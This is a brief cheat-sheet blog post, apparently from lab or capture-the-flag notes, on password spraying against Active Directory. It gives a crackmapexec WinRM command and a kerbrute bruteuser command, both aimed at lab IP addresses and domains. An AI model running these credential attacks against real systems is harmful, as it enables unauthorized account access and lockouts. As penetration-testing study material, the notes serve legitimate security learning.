---
description: >-
  Password Spraying
title: Password Spraying             # Add title here
date: 2023-01-21 08:00:00 -0600                           # Change the date to match completion date
categories: [12 Active Directory, AD - Enumeration]                     # Change Templates to Writeup
tags: [active directory, enumeration, password spraying]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### Crackmapexec
> While executing a Password Spraying attack with crackmapexec always run the `--continue-on-success` flag, sometimes there are some cases when two users can have the same password
{: .prompt-tip }

```bash
crackmapexec winrm 10.10.10.248 -u users -p 'NewIntelligenceCorpUser9876' --continue-on-success
```
Examples:
[Intelligence](https://shuciran.github.io/posts/Intelligence/#fnref:password-spraying)

### Kerbrute
> Users file must be only the user not the domain (correct: ksimpson, incorrect: ksimpson@scrm.local)
{: .prompt-warn }
```bash
kerbrute bruteuser --dc 10.10.11.168 -d scrm.local <users> <password>
```